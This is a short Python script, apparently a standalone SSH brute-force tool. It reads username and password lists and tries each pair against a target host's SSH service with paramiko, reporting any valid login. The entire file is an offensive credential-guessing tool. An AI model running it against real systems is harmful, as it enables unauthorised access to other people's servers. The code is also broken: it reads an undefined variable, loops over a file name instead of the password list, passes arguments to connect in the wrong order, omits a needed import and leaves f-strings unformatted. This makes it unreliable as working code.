import pyfiglet
import queue
import sys
import paramiko
import socket

q = queue.Queue
threads = 10
host = ''
userList = []
passList = []
port = 22

ascii_banner = pyfiglet.figlet_format("SSH Brute")
print(ascii_banner)

if len(sys.argv) == 4:
    host = sys.argv[1]
    userFile = sys.argv[2]
    passFile = sys.argv[3]
else:
    print("Usage: ssh-brute.py $host $userFile $passwordFile")
    exit()

def testSSH(host, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, user, password, timeout=3)
    except socket.timeout:
        print("[!]{host} unreachable")
        exit()
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        print("[!] Quota exceeded, increasing delay")
        time.sleep(60)
        return testSSH(host, user, password)
    else:
        return True

f = open(userFile, 'r')
for line in g:
    userList.append(line)
f.close()

g = open(passFile, 'r')
for line in g:
    passList.append(line)
g.close()

for user in userList:
    for password in passFile:
        if testSSH(host, user, password):
            print("[+] Valid credentials found! {host}: {user}:{password}")
            exit()
